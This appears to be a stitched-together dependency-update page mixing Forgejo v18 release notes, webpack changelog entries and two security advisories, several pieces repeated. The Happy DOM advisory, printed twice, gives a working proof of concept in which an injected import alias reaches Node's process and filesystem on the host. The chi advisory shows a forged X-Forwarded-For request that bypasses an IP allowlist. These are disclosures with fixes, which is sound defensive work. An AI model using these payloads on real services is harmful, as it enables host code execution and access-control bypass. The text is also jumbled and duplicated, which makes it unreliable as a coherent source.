## Release notes - Security bug fixes - [PR](https://codeberg.org/forgejo/forgejo/pulls/14811): 2026-10-12 security patches - Breaking security features - [PR](https://codeberg.org/forgejo/forgejo/pulls/14148): Move internal communication to UNIX socket. The `INTERNAL_TOKEN` can now be dropped from the configuration, and the UNIX socket path can be configured using the `INTERNAL_LISTENER_PATH` options. This change removes the `./forgejo generate secret INTERNAL_TOKEN` command and updates the contrib Forgejo systemd unit file. The `forgejo.service` example systemd file has been updated to set `RuntimeDirectory=forgejo`, which is a recommended setting for all systemd users.

milestone.title: Forgejo v18.0.0
milestone.description:
## Release notes - Security bug fixes - [PR](https://codeberg.org/forgejo/forgejo/pulls/14811): 2026-10-12 security patches - Breaking security features - [PR](https://codeberg.org/forgejo/forgejo/pulls/14148): Move internal communication to UNIX socket. The `INTERNAL_TOKEN` can now be dropped from the configuration, and the UNIX socket path can be configured using the `INTERNAL_LISTENER_PATH` options. This change removes the `./forgejo generate secret INTERNAL_TOKEN` command and updates the contrib Forgejo systemd unit file. The `forgejo.service` example systemd file has been updated to set `RuntimeDirectory=forgejo`, which is a recommended setting for all systemd users.
See the [documentation](https://forgejo.org/docs/latest/admin/config-cheat-sheet/#server-server) for more information. - User Interface features - [PR](https://codeberg.org/forgejo/forgejo/pulls/14536): make dropdowns dialog-based with various improvements - [PR](https://codeberg.org/forgejo/forgejo/pulls/14467): improve admin notices, make notice detail modals work w/o JS - [PR](https://codeberg.org/forgejo/forgejo/pulls/13284): feat(admin): add menu to edit user quota groups - [PR](https://codeberg.org/forgejo/forgejo/pulls/14836): show num commits behind on pr merge box - [PR](https://codeberg.org/forgejo/forgejo/pulls/14559): feat(diff/lfs): show Git LFS labels, diffs & raw links in web UI correctly - [PR](https://codeberg.org/forgejo/forgejo/pulls/14910): hide escape/unescape button conditionally in gitdiff and blame - [PR](https://codeberg.org/forgejo/forgejo/pulls/14038): adds inline copy buttons for new repo instructions - [PR](https://codeberg.org/forgejo/forgejo/pulls/14425): allow users to preview fonts in the ui - [PR](https://codeberg.org/forgejo/forgejo/pulls/14299): add reload protection to file dropzone and code review comments - [PR](https://codeberg.org/forgejo/forgejo/pulls/14158): accessible aria-labels & working commit description toggles w/o JS - [PR](https://codeberg.org/forgejo/forgejo/pulls/14522): disable text wrapping in code blocks - [PR](https://codeberg.org/forgejo/forgejo/pulls/13517): auth: start oauth2 login if its the only available login - User Interface bug fixes - [PR](https://codeberg.org/forgejo/forgejo/pulls/14905): close project-column-edit modal after confirming - [PR](https://codeberg.org/forgejo/forgejo/pulls/14345): redirect loop on repo with tag but no branch - [PR](https://codeberg.org/forgejo/forgejo/pulls/14579): Add horizontal scrolling to code blocks - [PR](https://codeberg.org/forgejo/forgejo/pulls/14435): Fix icons in milestone and project metadata not being consistent with how icons are used elsewhere on Forgejo - Localization - [PR](https://codeberg.org/forgejo/forgejo/pulls/14384): i18n: translations update from Codeberg Translate - Features - [PR](https://codeberg.org/forgejo/forgejo/pulls/11934): instance-wide Service Message via modal dialog - [PR](https://codeberg.org/forgejo/forgejo/pulls/14955): perf: improve performance of release & tag list pages - [PR](https://codeberg.org/forgejo/forgejo/pulls/14850): feat(api): reply to pull request review thread - [PR](https://codeberg.org/forgejo/forgejo/pulls/14204): add headings to common repository webpages - ### [`v5.112.2`](https://github.com/webpack/webpack/blob/HEAD/CHANGELOG.md#51122)

##### Patch Changes

- Reduce repeated scans when concatenating imported modules. (by [@​xiaoxiaojx](https://github.com/xiaoxiaojx) in [#​22865](https://github.com/webpack/webpack/pull/22865))

- Avoid allocating CSS module sets for single-group chunks. (by [@​xiaoxiaojx](https://github.com/xiaoxiaojx) in [#​22866](https://github.com/webpack/webpack/pull/22866))

- Return the value of every module type loaded with `importModule()`. (by [@​alexander-akait](https://github.com/alexander-akait) in [#​22869](https://github.com/webpack/webpack/pull/22869))

### [`v5.112.1`](https://github.com/webpack/webpack/blob/HEAD/CHANGELOG.md#51121)

[Compare Source](https://github.com/webpack/webpack/compare/v5.112.0...v5.112.1)

##### Patch Changes

- Rebuild a lazy barrel in watch when what it defers changes, and keep the imports and re-exports it still runs. (by [@​aryanraj45](https://github.com/aryanraj45) in [#​22699](https://github.com/webpack/webpack/pull/22699))

- Rebuild under `cacheUnaffected` a module whose re-export target goes or returns. (by [@​aryanraj45](https://github.com/aryanraj45) in [#​22749](https://github.com/webpack/webpack/pull/22749))

- Fix "Self-reference dependency has unused export name" for CommonJS namespace re-exports. (by [@​alexander-akait](https://github.com/alexander-akait) in [#​22791](https://github.com/webpack/webpack/pull/22791))

- Fix `exportType: "style"` CSS modules throwing outside the runtime chunk. (by [@​lazerg](https://github.com/lazerg) in [#​22833](https://github.com/webpack/webpack/pull/22833))

- Fix crash when a CSS module with `exportType: "style"` imports an ignored stylesheet. (by [@​codeXsidd](https://github.com/codeXsidd) in [#​22846](https://github.com/webpack/webpack/pull/22846))

- Keep empty process environment variables that `.env` files don't define in `DotenvPlugin`. (by [@​alexander-akait](https://github.com/alexander-akait) in [#​22794](https://github.com/webpack/webpack/pull/22794))

- Rehash an ESM entry chunk when a chunk it imports by file name changes. (by [@​alexander-akait](https://github.com/alexander-akait) in [#​22804](https://github.com/webpack/webpack/pull/22804))

### Happy DOM: Incomplete fix for CVE-2026-33943: unsanitized import alias leads to host code execution
[CVE-2026-115895](https://nvd.nist.gov/vuln/detail/CVE-2026-115895) / [GHSA-834v-8h66-3h79](https://github.com/advisories/GHSA-834v-8h66-3h79)

<details>
<summary>More information</summary>

#### Details
##### Summary

The ESM compiler in `happy-dom@20.14.5` does not validate imported local binding aliases before interpolating them into generated JavaScript.

As a result, an invalid ESM import alias can be transformed into a valid JavaScript destructuring default initializer and executed.

This appears to be an alternate injection path and incomplete remediation of GHSA-6q6h-j7hj-3r64 / CVE-2026-33943. The previous fix validates `importName` in the local `export { ... }` handler, but the named import handler still places an unvalidated `alias` directly into code context.

These issues were confirmed through the public `Window` and `<script type="module">` APIs using the published `happy-dom` npm package. The PoC reaches the Node.js host `process`, obtains `node:fs`, and creates a proof directory on the host filesystem.

##### Confirmed affected versions

The PoC was directly tested against:

- `happy-dom@17.0.0`
- `happy-dom@20.0.0`
- `happy-dom@20.1.0`
- `happy-dom@20.14.5`

The same PoC does not trigger on `happy-dom@16.8.1`.

The ESM compiler was introduced by commit `7bc831df2`, first released in `v17.0.0`. The vulnerable interpolation remains present through `v20.14.5`, the latest release at the time of testing.

Suggested affected range:

```text
>= 17.0.0, <= 20.14.5
```

No patched version is currently available.

##### Preconditions

- JavaScript evaluation is enabled with `enableJavaScriptEvaluation: true`.
- Attacker-controlled HTML or module source is processed by Happy DOM.
- This may affect SSR, preview, scraping, or testing services that evaluate externally supplied HTML.

##### Technical details

In `packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts`, the named import handler splits an import specifier and extracts its alias:

```ts
const nameParts = part.trim().split(/\s+as\s+/);
const alias = (nameParts[1] || nameParts[0]).replace(/["']/g, '');
const name = nameParts[0].replace(/["']/g, '');

if (alias && name) {
  properties.push({ name, alias });
}
```

Unlike the patched `export { ... }` handler, the value of `alias` is not validated as a JavaScript identifier.

It is subsequently inserted directly into generated binding syntax:

```ts
newCodeStart += `let {${properties
  .map((property) =>
    property.alias
      ? `"${property.name}": ${property.alias}`
      : property.name
  )
  .join(', ')}} = $happy_dom.imports.get('${url}')${match[8]}`;
```

Consider the following source:

```js
import {
  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} from './dep.json' with { type: 'json' };
```

This is invalid ECMAScript module syntax. Node.js rejects it at the `=` token.

Happy DOM instead transforms it into the equivalent of:

```js
let {
  "missing": injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} = $happy_dom.imports.get('https://poc.local/dep.json');
```

This generated JavaScript is valid. Because the imported JSON object does not contain a `missing` property, the default initializer executes.

The `with { type: 'json' }` attribute is relevant because the compiler only generates its circular import resolver for ESM imports:

```ts
if (!match[7] || match[7] === 'esm') {
  resolvableCircularImports.push({ url, properties });
}
```

Using a JSON module prevents the malicious alias from being emitted again in a later circular-import assignment, leaving the generated function syntactically valid.

Backtick strings also survive the existing quote removal. This allows the injected initializer to reach Node.js host APIs:

```js
globalThis.constructor.constructor(`return process`)()
  .getBuiltinModule(`node:fs`)
  .mkdirSync(
    globalThis.constructor.constructor(`return process`)().cwd() +
      `/HAPPY_DOM_RCE_PROOF`
  )
```

##### Proof of concept

The following PoC uses only the public Happy DOM API and performs a harmless filesystem action by creating a directory named `HAPPY_DOM_RCE_PROOF`.

##### 1. Create `package.json`

```json
{
  "name": "happy-dom-import-alias-rce-poc",
  "private": true,
  "type": "module",
  "dependencies": {
    "happy-dom": "20.14.5"
  }
}
```

##### 2. Create `dep.json`

```json
{}
```

##### 3. Create `payload.mjs`

This file is used as a control to demonstrate that a native ECMAScript parser rejects the source:

```js
import {
  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} from './dep.json' with { type: 'json' };
```

##### 4. Create `poc.mjs`

```js
import { Window } from 'happy-dom';
import { existsSync, rmSync } from 'node:fs';
import { resolve } from 'node:path';

const proofDirectory = resolve('HAPPY_DOM_RCE_PROOF');
rmSync(proofDirectory, { recursive: true, force: true });

const window = new Window({
  url: 'https://poc.local/',
  settings: {
    enableJavaScriptEvaluation: true,
    suppressCodeGenerationFromStringsWarning: true,
    fetch: {
      virtualServers: [
        {
          url: 'https://poc.local/',
          directory: process.cwd()
        }
      ]
    }
  }
});

const script = window.document.createElement('script');
script.type = 'module';

script.textContent = `
  import {
    missing as injected = globalThis.constructor.constructor(\`return process\`)()
      .getBuiltinModule(\`node:fs\`)
      .mkdirSync(
        globalThis.constructor.constructor(\`return process\`)().cwd() +
        \`/HAPPY_DOM_RCE_PROOF\`
      )
  } from './dep.json' with { type: 'json' };
`;

window.document.body.appendChild(script);
await window.happyDOM.waitUntilComplete();

if (!existsSync(proofDirectory)) {
  console.error('[-] Exploit failed: proof directory was not created.');
  console.error(
    window.happyDOM.virtualConsolePrinter.readAsString()
  );
  process.exitCode = 1;
} else {
  console.log(`[+] Host filesystem reached: ${proofDirectory}`);
}

await window.happyDOM.close();
```

##### 5. Run the control test

```console
npm install
node --check payload.mjs
```

Expected result:

```text
SyntaxError: Unexpected token '='
```

This confirms that the source is not valid ESM.

##### 6. Run the Happy DOM PoC

```console
node poc.mjs
```

Expected result:

```text
[+] Host filesystem reached: /path/to/HAPPY_DOM_RCE_PROOF
```

The existence of `HAPPY_DOM_RCE_PROOF` confirms that the expression injected through the import alias executed and reached the host filesystem.

The PoC was also verified inside a `node:24-alpine` Docker container, where it created:

```text
/poc/HAPPY_DOM_RCE_PROOF
```

##### Impact

An attacker who can supply module source to an application that evaluates JavaScript through Happy DOM can cause syntactically invalid import declarations to be transformed into executable JavaScript.

This may bypass upstream syntax validation or application assumptions that malformed import clauses will be rejected.

The demonstrated payload reaches Node.js `process` and built-in modules. It can therefore be adapted to read or modify files, access environment data, or execute operating-system commands with the privileges of the Happy DOM host process.

##### Relationship to CVE-2026-33943

CVE-2026-33943 covers expression injection through a local export declaration:

```js
export { attacker_expression }
```

Its fix added identifier validation to the `importName` used by the `export { ... }` handler:

```ts
if (
  exportName &&
  importName &&
  VALID_VARIABLE_NAME_REGEXP.test(importName)
) {
  // ...
}
```

This report uses a different parsing and code-generation path:

```js
import { name as malicious_alias } from './module';
```

The unvalidated value is the local import `alias`, and the injection occurs in a generated destructuring binding rather than the export assignment patched by CVE-2026-33943.

The issue remains reproducible in versions released after the CVE-2026-33943 fix, including `20.14.5`.

##### Suggested fix

Validate the imported local binding before placing it into code context. The existing `VALID_VARIABLE_NAME_REGEXP` can be reused:

```diff
- if (alias && name) {
+ if (alias && name && VALID_VARIABLE_NAME_REGEXP.test(alias)) {
```

A regression test should compile and execute the malicious import declaration, then verify that the initializer was not evaluated.

This change was tested locally. The focused `ECMAScriptModuleCompiler` test suite passes with 30 tests, and ESLint reports no errors.

For additional hardening, generated property keys should use `JSON.stringify()` instead of manual quote interpolation.

### chi: Client IP spoofing in ClientIPFromXFF via X-Forwarded-For
[CVE-2026-114437](https://nvd.nist.gov/vuln/detail/CVE-2026-114437) / [GHSA-j6qf-3m9c-vwj3](https://github.com/advisories/GHSA-j6qf-3m9c-vwj3)

<details>
<summary>More information</summary>

#### Details
##### Summary

`ClientIPFromXFF` skips any `X-Forwarded-For` entry in a configured trusted CIDR but never verifies that the direct TCP peer in `http.Request.RemoteAddr` belongs to that CIDR. A client that can reach the Go server directly can therefore append a trusted-looking proxy address and choose the client IP returned by `middleware.GetClientIP`.

The attack is remote and requires one unauthenticated HTTP request with no user interaction (AV:N/AC:L/PR:N/UI:N). It changes security decisions and exposes one protected handler within the same application (S:U/C:L/I:L); no availability loss was observed (A:N).

**Preconditions:** The application uses `ClientIPFromXFF` and makes the origin server reachable by an anonymous client outside the configured trusted-proxy CIDRs. No victim interaction is required.

1. Send `GET /admin` directly to the origin with no `X-Forwarded-For` header.
2. Observe a `403 Forbidden` response and an empty derived client IP.
3. Repeat the request with `X-Forwarded-For: 10.0.0.7, 198.51.100.42`.
4. Observe `200 OK` and `client-ip="10.0.0.7"`. Expected: the untrusted direct peer prevents the forwarding chain from being accepted.

##### Details

The vulnerable code is `ClientIPFromXFF` in `middleware/client_ip.go`, lines 93-116 at the tested revision. It calls `walkXFF` with only the attacker-controlled header, skips every entry that matches a trusted prefix, and stores the first remaining address:

```go
walkXFF(r.Header[xForwardedForHeader], func(v string) bool {
	ip, ok := parseHeaderAddr(v)
	if !ok {
		return true
	}
	if inAnyPrefix(ip, prefixes) {
		return false
	}
	found = ip
	return true
})
```

The function does not parse `r.RemoteAddr` before this walk. Consequently, the configured CIDRs identify trusted strings inside `X-Forwarded-For`, but do not establish that the immediate sender is one of those trusted proxies.

##### Proof of concept

Using Go 1.24 or later, create and run this minimal application against the tested revision:

```sh
mkdir chi-clientip-poc
cd chi-clientip-poc
go mod init clientip-poc
go get github.com/go-chi/chi/v5@167e1e3bd039d060696b99c8da4e876ae04f42c1
cat > main.go <<'EOF'
package main

import (
	"fmt"
	"log"
	"net/http"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"
)

const allowedIP = "10.0.0.7"

func main() {
	r := chi.NewRouter()
	r.Use(middleware.ClientIPFromXFF("198.51.100.0/24"))
	r.Get("/admin", func(w http.ResponseWriter, r *http.Request) {
		clientIP := middleware.GetClientIP(r.Context())
		if clientIP != allowedIP {
			http.Error(w, fmt.Sprintf("denied: tcp-peer=%q client-ip=%q", r.RemoteAddr, clientIP), http.StatusForbidden)
			return
		}
		fmt.Fprintf(w, "allowed: tcp-peer=%q client-ip=%q\n", r.RemoteAddr, clientIP)
	})

	log.Print("listening on http://127.0.0.1:3001")
	log.Fatal(http.ListenAndServe("127.0.0.1:3001", r))
}
EOF
go run .
```

The no-header control was rejected:

```console
$ curl --http1.1 -i http://127.0.0.1:3001/admin
HTTP/1.1 403 Forbidden
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
Date: Tue, 06 Oct 2026 15:46:27 GMT
Content-Length: 48

denied: tcp-peer="127.0.0.1:54416" client-ip=""
```

Adding the forged chain authorized the same direct client:

```console
$ curl --http1.1 -i -H 'X-Forwarded-For: 10.0.0.7, 198.51.100.42' http://127.0.0.1:3001/admin
HTTP/1.1 200 OK
Date: Tue, 06 Oct 2026 15:46:33 GMT
Content-Length: 57
Content-Type: text/plain; charset=utf-8

allowed: tcp-peer="127.0.0.1:54417" client-ip="10.0.0.7"
```

##### Impact

I made an anonymous direct connection from `127.0.0.1`, supplied a header that ended in a different trusted-proxy CIDR, and caused the application to treat my client IP as the allowlisted `10.0.0.7`. This changed the authorization decision from `403 Forbidden` to `200 OK` for the protected handler.

- Vector String: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N`

### Happy DOM: Incomplete fix for CVE-2026-33943: unsanitized import alias leads to host code execution
[CVE-2026-115895](https://nvd.nist.gov/vuln/detail/CVE-2026-115895) / [GHSA-834v-8h66-3h79](https://github.com/advisories/GHSA-834v-8h66-3h79)

<details>
<summary>More information</summary>

#### Details
##### Summary

The ESM compiler in `happy-dom@20.14.5` does not validate imported local binding aliases before interpolating them into generated JavaScript.

As a result, an invalid ESM import alias can be transformed into a valid JavaScript destructuring default initializer and executed.

This appears to be an alternate injection path and incomplete remediation of GHSA-6q6h-j7hj-3r64 / CVE-2026-33943. The previous fix validates `importName` in the local `export { ... }` handler, but the named import handler still places an unvalidated `alias` directly into code context.

These issues were confirmed through the public `Window` and `<script type="module">` APIs using the published `happy-dom` npm package. The PoC reaches the Node.js host `process`, obtains `node:fs`, and creates a proof directory on the host filesystem.

##### Confirmed affected versions

The PoC was directly tested against:

- `happy-dom@17.0.0`
- `happy-dom@20.0.0`
- `happy-dom@20.1.0`
- `happy-dom@20.14.5`

The same PoC does not trigger on `happy-dom@16.8.1`.

The ESM compiler was introduced by commit `7bc831df2`, first released in `v17.0.0`. The vulnerable interpolation remains present through `v20.14.5`, the latest release at the time of testing.

Suggested affected range:

```text
>= 17.0.0, <= 20.14.5
```

No patched version is currently available.

##### Preconditions

- JavaScript evaluation is enabled with `enableJavaScriptEvaluation: true`.
- Attacker-controlled HTML or module source is processed by Happy DOM.
- This may affect SSR, preview, scraping, or testing services that evaluate externally supplied HTML.

##### Technical details

In `packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts`, the named import handler splits an import specifier and extracts its alias:

```ts
const nameParts = part.trim().split(/\s+as\s+/);
const alias = (nameParts[1] || nameParts[0]).replace(/["']/g, '');
const name = nameParts[0].replace(/["']/g, '');

if (alias && name) {
  properties.push({ name, alias });
}
```

Unlike the patched `export { ... }` handler, the value of `alias` is not validated as a JavaScript identifier.

It is subsequently inserted directly into generated binding syntax:

```ts
newCodeStart += `let {${properties
  .map((property) =>
    property.alias
      ? `"${property.name}": ${property.alias}`
      : property.name
  )
  .join(', ')}} = $happy_dom.imports.get('${url}')${match[8]}`;
```

Consider the following source:

```js
import {
  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} from './dep.json' with { type: 'json' };
```

This is invalid ECMAScript module syntax. Node.js rejects it at the `=` token.

Happy DOM instead transforms it into the equivalent of:

```js
let {
  "missing": injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} = $happy_dom.imports.get('https://poc.local/dep.json');
```

This generated JavaScript is valid. Because the imported JSON object does not contain a `missing` property, the default initializer executes.

The `with { type: 'json' }` attribute is relevant because the compiler only generates its circular import resolver for ESM imports:

```ts
if (!match[7] || match[7] === 'esm') {
  resolvableCircularImports.push({ url, properties });
}
```

Using a JSON module prevents the malicious alias from being emitted again in a later circular-import assignment, leaving the generated function syntactically valid.

Backtick strings also survive the existing quote removal. This allows the injected initializer to reach Node.js host APIs:

```js
globalThis.constructor.constructor(`return process`)()
  .getBuiltinModule(`node:fs`)
  .mkdirSync(
    globalThis.constructor.constructor(`return process`)().cwd() +
      `/HAPPY_DOM_RCE_PROOF`
  )
```

##### Proof of concept

The following PoC uses only the public Happy DOM API and performs a harmless filesystem action by creating a directory named `HAPPY_DOM_RCE_PROOF`.

##### 1. Create `package.json`

```json
{
  "name": "happy-dom-import-alias-rce-poc",
  "private": true,
  "type": "module",
  "dependencies": {
    "happy-dom": "20.14.5"
  }
}
```

##### 2. Create `dep.json`

```json
{}
```

##### 3. Create `payload.mjs`

This file is used as a control to demonstrate that a native ECMAScript parser rejects the source:

```js
import {
  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} from './dep.json' with { type: 'json' };
```

##### 4. Create `poc.mjs`

```js
import { Window } from 'happy-dom';
import { existsSync, rmSync } from 'node:fs';
import { resolve } from 'node:path';

const proofDirectory = resolve('HAPPY_DOM_RCE_PROOF');
rmSync(proofDirectory, { recursive: true, force: true });

const window = new Window({
  url: 'https://poc.local/',
  settings: {
    enableJavaScriptEvaluation: true,
    suppressCodeGenerationFromStringsWarning: true,
    fetch: {
      virtualServers: [
        {
          url: 'https://poc.local/',
          directory: process.cwd()
        }
      ]
    }
  }
});

const script = window.document.createElement('script');
script.type = 'module';

script.textContent = `
  import {
    missing as injected = globalThis.constructor.constructor(\`return process\`)()
      .getBuiltinModule(\`node:fs\`)
      .mkdirSync(
        globalThis.constructor.constructor(\`return process\`)().cwd() +
        \`/HAPPY_DOM_RCE_PROOF\`
      )
  } from './dep.json' with { type: 'json' };
`;

window.document.body.appendChild(script);
await window.happyDOM.waitUntilComplete();

if (!existsSync(proofDirectory)) {
  console.error('[-] Exploit failed: proof directory was not created.');
  console.error(
    window.happyDOM.virtualConsolePrinter.readAsString()
  );
  process.exitCode = 1;
} else {
  console.log(`[+] Host filesystem reached: ${proofDirectory}`);
}

await window.happyDOM.close();
```

##### 5. Run the control test

```console
npm install
node --check payload.mjs
```

Expected result:

```text
SyntaxError: Unexpected token '='
```

This confirms that the source is not valid ESM.

##### 6. Run the Happy DOM PoC

```console
node poc.mjs
```

Expected result:

```text
[+] Host filesystem reached: /path/to/HAPPY_DOM_RCE_PROOF
```

The existence of `HAPPY_DOM_RCE_PROOF` confirms that the expression injected through the import alias executed and reached the host filesystem.

The PoC was also verified inside a `node:24-alpine` Docker container, where it created:

```text
/poc/HAPPY_DOM_RCE_PROOF
```

##### Impact

An attacker who can supply module source to an application that evaluates JavaScript through Happy DOM can cause syntactically invalid import declarations to be transformed into executable JavaScript.

This may bypass upstream syntax validation or application assumptions that malformed import clauses will be rejected.

The demonstrated payload reaches Node.js `process` and built-in modules. It can therefore be adapted to read or modify files, access environment data, or execute operating-system commands with the privileges of the Happy DOM host process.

##### Relationship to CVE-2026-33943

CVE-2026-33943 covers expression injection through a local export declaration:

```js
export { attacker_expression }
```

Its fix added identifier validation to the `importName` used by the `export { ... }` handler:

```ts
if (
  exportName &&
  importName &&
  VALID_VARIABLE_NAME_REGEXP.test(importName)
) {
  // ...
}
```

This report uses a different parsing and code-generation path:

```js
import { name as malicious_alias } from './module';
```

The unvalidated value is the local import `alias`, and the injection occurs in a generated destructuring binding rather than the export assignment patched by CVE-2026-33943.

The issue remains reproducible in versions released after the CVE-2026-33943 fix, including `20.14.5`.

##### Suggested fix

Validate the imported local binding before placing it into code context. The existing `VALID_VARIABLE_NAME_REGEXP` can be reused:

```diff
- if (alias && name) {
+ if (alias && name && VALID_VARIABLE_NAME_REGEXP.test(alias)) {
```

A regression test should compile and execute the malicious import declaration, then verify that the initializer was not evaluated.

This change was tested locally. The focused `ECMAScriptModuleCompiler` test suite passes with 30 tests, and ESLint reports no errors.

For additional hardening, generated property keys should use `JSON.stringify()` instead of manual quote interpolation.
